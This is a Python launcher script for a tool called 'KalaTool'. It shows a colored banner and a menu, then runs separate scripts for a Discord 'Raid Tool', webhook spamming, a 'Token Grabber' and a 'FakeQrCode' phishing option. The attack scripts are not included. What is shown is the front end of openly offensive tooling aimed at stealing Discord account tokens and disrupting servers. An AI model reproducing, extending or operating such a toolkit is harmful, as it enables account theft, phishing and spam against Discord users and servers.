import requests
import os
import sys
import time
import random
import os.path
import string
import subprocess
import pyperclip
import pyautogui
import urllib.request
import random
import threading
import ctypes
import base64
import discord
import json
import datetime
import shutil
import aiohttp
import asyncio

from pyfade import Fade, Colors
from pycenter import center

from os import system, mkdir, name
from os.path import isdir
from base64 import b64decode as bd
from requests import get



from pycenter import center
from pyfade import Fade, Colors, Anime

from colorama import Fore, init
from dhooks import Webhook
from selenium import webdriver
from PIL import Image
from bs4 import BeautifulSoup
import requests as req
from threading import Thread as thr
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
from datetime import datetime
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter

ctypes.windll.kernel32.SetConsoleTitleW("[KalaTool] - Home")
y = Fore.LIGHTRED_EX
b = Fore.LIGHTBLUE_EX

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)

banner = """
 _   __      _     _____           _ 
| | / /     | |   |_   _|         | |
| |/ /  __ _| | __ _| | ___   ___ | |
|    \ / _` | |/ _` | |/ _ \ / _ \| |
| |\  \ (_| | | (_| | | (_) | (_) | |
\_| \_/\__,_|_|\__,_\_/\___/ \___/|_|
                                     
                                     
"""[1:]
 
def kalahome():
    print(Fade.Vertical(Colors.blue_to_cyan, center(banner)))

    print (Fade.Vertical(Colors.blue_to_cyan, "------------------------------------------------------------------------------------------------------------------------"))
    print(Fade.Vertical(Colors.red_to_yellow, center("\n"*1 + "|| !Kaladin#1010 ||\n discord.gg/myrah" + "\n"*2)))
    print (Fade.Vertical(Colors.blue_to_cyan, "------------------------------------------------------------------------------------------------------------------------"))
                       


def main():
    os.system('cls')
    Spinner()
    os.system('cls')
    kalahome()
    print(f"""\n       {Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Main Options:          {Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }+{Fore.LIGHTRED_EX }]{Fore.LIGHTBLUE_EX } Token Options:\n""")
    print(f"""            {Fore.LIGHTRED_EX }[{Fore.LIGHTMAGENTA_EX }01{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } Raid Tool              {Fore.LIGHTRED_EX }[{Fore.LIGHTMAGENTA_EX }03{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } Token Grabber\n""")
    print(f"""            {Fore.LIGHTRED_EX }[{Fore.LIGHTMAGENTA_EX }02{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } WebHooks Spam          {Fore.LIGHTRED_EX }[{Fore.LIGHTMAGENTA_EX }04{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } FakeQrCode\n""")
    global choice
    choice = input(f"""{Fore.LIGHTRED_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTRED_EX }]{Fore.LIGHTMAGENTA_EX } Choice: """)


    if choice == '1' or choice == '01':
        os.system('cls')
        Spinner()
        os.system('cls')
        script_name = 'Additional_File/1_Raid/raid.py'
        cmd_line = [sys.executable, script_name]
        subprocess.check_call(cmd_line)
		
    elif choice == '2' or choice == '02':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/2_WebhookSpam/webhookspam.py').read())

    elif choice == '3' or choice == '03':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/3_TokenGrab/tokengrabber.py').read())

    elif choice == '4' or choice == '04':
        os.system('cls')
        Spinner()
        os.system('cls')
        exec(open('Additional_File/4_TokenFakeQr/fakeqr.py').read())

    else:
        os.system('cls')
        main()

main()
